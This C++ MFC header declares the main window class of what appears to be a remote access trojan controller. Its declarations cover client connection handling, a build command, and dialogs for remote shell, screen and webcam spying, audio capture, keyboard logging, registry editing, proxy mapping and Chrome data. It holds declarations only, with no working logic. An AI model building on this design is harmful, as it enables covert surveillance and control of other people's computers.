// MainFrm.h : interface of the CMainFrame class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_MAINFRM_H__8341639A_B7C3_4A82_967E_DEB461FB2048__INCLUDED_)
#define AFX_MAINFRM_H__8341639A_B7C3_4A82_967E_DEB461FB2048__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000




class CMainFrame : public CXTPFrameWnd
{
	
protected: // create from serialization only
	CMainFrame();
	DECLARE_DYNCREATE(CMainFrame)
	CString strStatusBar;
// Attributes
public:
	void Activate(int nPort, int nMaxConnections);
	static void CALLBACK NotifyProc(ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);
	static void ProcessReceive(ClientContext *pContext);
	void ShowToolTips(LPCTSTR lpszText);
	CMap<UINT,UINT, CWnd* , CWnd*> m_mapPanes;
	int m_nCount;
// Operations
public:
	int nOSCount [11];
	void ShowConnectionsNumber();

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainFrame)
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	//}}AFX_VIRTUAL

// Implementation
public:
	virtual ~CMainFrame();
	BOOL m_bSetRestart;
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:  // control bar embedded members
	CXTPStatusBar  m_wndStatusBar;
	CXTPTrayIcon m_TrayIcon;
	CToolBar    m_wndToolBar;
	CImageList	m_ToolBarList;
	CXTPDockingPaneManager  m_paneManager;
	CXTPDockingPane* CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour = NULL);

// Generated message map functions
protected:
	//{{AFX_MSG(CMainFrame)
	afx_msg int OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl);
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnMenuitemShow();
	afx_msg void OnMenuitemHide();
	afx_msg void OnClose();
	afx_msg void OnMenuitemSetting();
	afx_msg void OnMenuitemBuild();
	afx_msg void OnTimer(UINT nIDEvent);
	afx_msg void OnTools();
	afx_msg void OnHackerTools();
	afx_msg void LoadIcons();
	afx_msg void OnSz();
	//}}AFX_MSG
	afx_msg void OnCustomize();
/*
	afx_msg int OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl);
	afx_msg void OnPopup();*/

	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg	LRESULT OnOpenScreenSpyDialog1(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnModifyList(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenServiceDialog(WPARAM, LPARAM);
    afx_msg	LRESULT	OnOpenRegeditDialog(WPARAM, LPARAM);
    afx_msg	LRESULT	OnOpenTextChatDialog(WPARAM, LPARAM);
    afx_msg	LRESULT	OnOpenProxyMapDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnDockingPaneNotify(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenChromeDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenChatDialog(WPARAM,LPARAM);

	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAINFRM_H__8341639A_B7C3_4A82_967E_DEB461FB2048__INCLUDED_)
